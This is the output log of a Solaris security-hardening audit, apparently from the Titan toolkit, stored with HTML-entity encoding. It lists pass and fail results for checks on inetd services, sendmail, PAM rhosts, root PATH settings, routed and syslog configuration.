&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/inetd.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/inetd.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;File&#x00A0;/etc/inet/inetd.conf&#x00A0;exists&#x00A0;-&#x00A0;Checking...
&#x00A0;name&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;exec&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;comsat&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;talk&#x00A0;Open&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;uucp&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;smtp&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;tftp&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;finger&#x00A0;Open&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;systat&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;netstat&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;rquotad&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;rusersd&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;sprayd&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;walld&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;rexd&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;shell&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;login&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;exec&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;comsat&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;time&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;echo&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;discard&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;daytime&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;chargen&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;100087&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;rwalld&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;rstatd&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;100068&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;100083&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;100221&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;fs&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;ufsd&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;100232&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;100235&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;536870916&#x00A0;Closed&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/keyserv.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/keyserv.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;In&#x00A0;/etc/rc2.d/S71rpc&#x00A0;keyserv&#x00A0;;&#x00A0;user&#x00A0;nobody&#x00A0;enabled&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/log-tcp.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/log-tcp.sh.V.042506

&#x00A0;-----------------------------------------------------
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/loginlog.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/loginlog.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;No&#x00A0;/var/adm/loginlog&#x00A0;file&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/lpsched.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/lpsched.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;In&#x00A0;/etc/rc2.d/S80lp&#x00A0;lpsched&#x00A0;is&#x00A0;enabled&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/nfs-portmon.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/nfs-portmon.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;NFS&#x00A0;port&#x00A0;monitor&#x00A0;disabled&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/nsswitch.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/nsswitch.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;passwd&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;group&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;hosts&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;networks&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;protocols&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;rpc&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;ethers&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;netmasks&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;bootparams&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;publickey&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;netgroup&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;automount&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;aliases&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;services&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;sendmailvars&#x00A0;-&#x003E;&#x00A0;files&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;15&#x00A0;of&#x00A0;15&#x00A0;entries&#x00A0;set&#x00A0;to&#x00A0;files&#x00A0;as&#x00A0;default&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/nuke-sendmail.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/nuke-sendmail.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Sendmail&#x00A0;is&#x00A0;enabled&#x00A0;in&#x00A0;/etc/rc2.d/S88sendmail&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/pam-rhosts-2.6.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/pam-rhosts-2.6.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;PAM&#x00A0;allows&#x00A0;rhosts&#x00A0;for&#x00A0;rlogin&#x00A0;:&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;PAM&#x00A0;allows&#x00A0;rhosts&#x00A0;for&#x00A0;rsh&#x00A0;:&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/passwd.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/passwd.sh.V.042506

&#x00A0;-----------------------------------------------------
&#x00A0;All&#x00A0;accounts&#x00A0;have&#x00A0;passwords&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/powerd.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/powerd.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Power&#x00A0;management&#x00A0;not&#x00A0;set&#x00A0;to&#x00A0;be&#x00A0;run&#x00A0;by&#x00A0;root&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/psfix.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/psfix.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Could&#x00A0;not&#x00A0;find&#x00A0;/etc/rc3.d/S79tmpfix&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;Run&#x00A0;with&#x00A0;-[Ff]&#x00A0;option&#x00A0;to&#x00A0;fix
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/rhosts.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/rhosts.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;Running&#x00A0;against&#x00A0;/etc/passwd...
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/rootchk.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/rootchk.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/.login&#x00A0;-&#x00A0;Clean&#x00A0;of&#x00A0;.&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc/.login&#x00A0;-&#x00A0;Clean&#x00A0;of&#x00A0;.&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc/default/login&#x00A0;-&#x00A0;Clean&#x00A0;of&#x00A0;.&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/.cshrc&#x00A0;-&#x00A0;Clean&#x00A0;of&#x00A0;.&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc/skel/local.cshrc&#x00A0;-&#x00A0;Contains&#x00A0;.&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;set&#x00A0;path=(/bin&#x00A0;/usr/bin&#x00A0;/usr/ucb&#x00A0;/etc&#x00A0;.)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc/skel/local.login&#x00A0;-&#x00A0;Clean&#x00A0;of&#x00A0;.&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc/skel/local.profile&#x00A0;-&#x00A0;Clean&#x00A0;of&#x00A0;.&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/.profile&#x00A0;-&#x00A0;Clean&#x00A0;of&#x00A0;.&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/etc/profile&#x00A0;-&#x00A0;Clean&#x00A0;of&#x00A0;.&#x00A0;-&#x00A0;PASSES&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/routed.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/routed.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;
&#x00A0;The&#x00A0;route&#x00A0;daemon&#x00A0;advertises&#x00A0;routes&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/sendmail.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/sendmail.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;No&#x00A0;sendmail.cf.titan2&#x00A0;exists&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;Run&#x00A0;with&#x00A0;-[Ff]&#x00A0;option&#x00A0;to&#x00A0;fix.
&#x00A0;Checking&#x00A0;for&#x00A0;smrsh
&#x00A0;smrsh&#x00A0;not&#x00A0;found&#x00A0;in&#x00A0;/sbin&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/smtp-banner.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/smtp-banner.sh.V.042506
&#x00A0;-----------------------------------------------------

&#x00A0;No&#x00A0;/etc/mail/sendmail.cf&#x00A0;exists&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/smtpbanner-8.8.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/smtpbanner-8.8.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;ERROR&#x00A0;-&#x00A0;This&#x00A0;script&#x00A0;is&#x00A0;Only&#x00A0;supported&#x00A0;on&#x00A0;patched&#x00A0;Solaris&#x00A0;2.6&#x00A0;and&#x00A0;newer,
&#x00A0;please&#x00A0;use&#x00A0;one&#x00A0;of&#x00A0;the&#x00A0;other&#x00A0;scripts&#x00A0;for&#x00A0;your&#x00A0;OS
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/snmpdx-2.6.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/snmpdx-2.6.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;ERROR&#x00A0;-&#x00A0;This&#x00A0;script&#x00A0;is&#x00A0;Only&#x00A0;supported&#x00A0;on&#x00A0;Solaris&#x00A0;2.6&#x00A0;and&#x00A0;newer,
&#x00A0;please&#x00A0;use&#x00A0;one&#x00A0;of&#x00A0;the&#x00A0;other&#x00A0;scripts&#x00A0;for&#x00A0;your&#x00A0;OS
&#x00A0;
&#x00A0;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;&#x005F;
&#x00A0;*=*=*=*=*&#x00A0;Running&#x00A0;modules/syslog.sh&#x00A0;now.....
&#x00A0;Output&#x00A0;to&#x00A0;../logs/modules/syslog.sh.V.042506
&#x00A0;-----------------------------------------------------
&#x00A0;File&#x00A0;/etc/syslog.conf&#x00A0;exists&#x00A0;checking&#x00A0;contents....
&#x00A0;Syslog&#x00A0;auth&#x00A0;notice&#x00A0;messages&#x00A0;disabled&#x00A0;-&#x00A0;FAILS&#x00A0;CHECK
&#x00A0;
